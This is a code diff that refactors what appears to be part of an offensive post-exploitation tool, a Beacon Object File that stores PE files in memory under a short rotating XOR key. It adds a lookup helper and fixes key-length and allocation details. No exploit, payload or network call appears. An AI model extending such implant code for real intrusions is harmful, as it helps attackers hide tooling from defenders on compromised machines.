@@ -268,6 +268,29 @@ Cleanup:
     return ret_val;
 }
 
+PSAVED_PE find_pe_by_name(
+    IN LPSTR pe_name)
+{
+    PSAVED_PE saved_pe = NULL;
+
+    saved_pe = BeaconGetValue(NC_PE_INFO_KEY);
+    while (saved_pe)
+    {
+        if (!_stricmp(saved_pe->pe_name, pe_name))
+            break;
+
+        saved_pe = saved_pe->next;
+    }
+
+    if (!saved_pe)
+    {
+        DPRINT("%s was not found", pe_name);
+        return NULL;
+    }
+
+    return saved_pe;
+}
+
 VOID run_xor_on_pe(
     IN PSAVED_PE saved_pe)
 {
@@ -316,6 +339,13 @@ BOOL save_pe_info(
     if (!pe_name || !pe_bytes || !pe_length)
         return TRUE;
 
+    // check the PE is not already saved
+    if (find_pe_by_name(pe_name))
+    {
+        DPRINT("The PE %s is already saved", pe_name);
+        return TRUE;
+    }
+
     VOID (WINAPI *srand) (int) = xGetProcAddress(xGetLibAddress("msvcrt", TRUE, NULL), "srand", 0);
     int (WINAPI *rand) (void)  = xGetProcAddress(xGetLibAddress("msvcrt", TRUE, NULL), "rand", 0);
     time_t (WINAPI* time) (time_t*) = xGetProcAddress(xGetLibAddress("msvcrt", TRUE, NULL), "time", 0);
@@ -338,22 +368,6 @@ BOOL save_pe_info(
         return FALSE;
     }
 
-    // check the PE is not already saved
-    tmp = BeaconGetValue(NC_PE_INFO_KEY);
-    while (tmp)
-    {
-        if (!_stricmp(tmp->pe_name, pe_name))
-            break;
-
-        tmp = tmp->next;
-    }
-
-    if (tmp)
-    {
-        DPRINT("The PE %s is already saved", pe_name);
-        return TRUE;
-    }
-
     // allocate the SAVED_PE structure
     saved_pe = intAlloc(sizeof(SAVED_PE));
 
@@ -365,8 +379,6 @@ BOOL save_pe_info(
     if (saved_pe->xor_length < MIN_XOR_KEY_LENGTH)
         saved_pe->xor_length = MIN_XOR_KEY_LENGTH;
 
-    saved_pe->xor_length = 2;
-
     saved_pe->xor_key = intAlloc(saved_pe->xor_length);
 
     for (int i = 0; i < saved_pe->xor_length; ++i)
@@ -376,7 +388,7 @@ BOOL save_pe_info(
 
     // store the PE
     saved_pe->pe_size = pe_length;
-    saved_pe->pe_base = intAlloc(saved_pe->pe_size + 1);
+    saved_pe->pe_base = intAlloc(saved_pe->pe_size);
     if (!saved_pe->pe_base)
     {
         function_failed("malloc");
@@ -427,21 +439,9 @@ BOOL get_saved_pe(
 {
     PSAVED_PE saved_pe = NULL;
 
-    // look for the PE by name
-    saved_pe = BeaconGetValue(NC_PE_INFO_KEY);
-    while (saved_pe)
-    {
-        if (!_stricmp(saved_pe->pe_name, pe_name))
-            break;
-
-        saved_pe = saved_pe->next;
-    }
-
+    saved_pe = find_pe_by_name(pe_name);
     if (!saved_pe)
-    {
-        DPRINT("%s was not found", pe_name);
         return FALSE;
-    }
 
     DPRINT("Found %s", saved_pe->pe_name);
 
@@ -464,29 +464,17 @@ BOOL reencrypt_pe(
 {
     PSAVED_PE saved_pe = NULL;
 
-    // look for the PE by name
-    saved_pe = BeaconGetValue(NC_PE_INFO_KEY);
-    while (saved_pe)
-    {
-        if (!_stricmp(saved_pe->pe_name, pe_name))
-            break;
-
-        saved_pe = saved_pe->next;
-    }
-
+    saved_pe = find_pe_by_name(pe_name);
     if (!saved_pe)
-    {
-        DPRINT("%s was not found", pe_name);
         return FALSE;
+
+    if (!saved_pe->encrypted)
+    {
+        // encrypt the PE
+        run_xor_on_pe(saved_pe);
+
+        DPRINT("reencrypted %s", saved_pe->pe_name);
     }
-
-    if (saved_pe->encrypted)
-        return TRUE;
-
-    // encrypt the PE
-    run_xor_on_pe(saved_pe);
-
-    DPRINT("reencrypted %s", saved_pe->pe_name);
 
     return TRUE;
 }
@@ -526,24 +514,17 @@ BOOL remove_saved_pe(
             // remove PE from linked list
             if (!tmp)
             {
+                if (!BeaconRemoveValue(NC_PE_INFO_KEY))
+                {
+                    function_failed("BeaconRemoveValue");
+                    return FALSE;
+                }
+
                 if (saved_pe->next)
                 {
-                    if (!BeaconRemoveValue(NC_PE_INFO_KEY))
-                    {
-                        function_failed("BeaconRemoveValue");
-                        return FALSE;
-                    }
                     if (!BeaconAddValue(NC_PE_INFO_KEY, saved_pe->next))
                     {
                         function_failed("BeaconAddValue");
-                        return FALSE;
-                    }
-                }
-                else
-                {
-                    if (!BeaconRemoveValue(NC_PE_INFO_KEY))
-                    {
-                        function_failed("BeaconRemoveValue");
                         return FALSE;
                     }
                 }
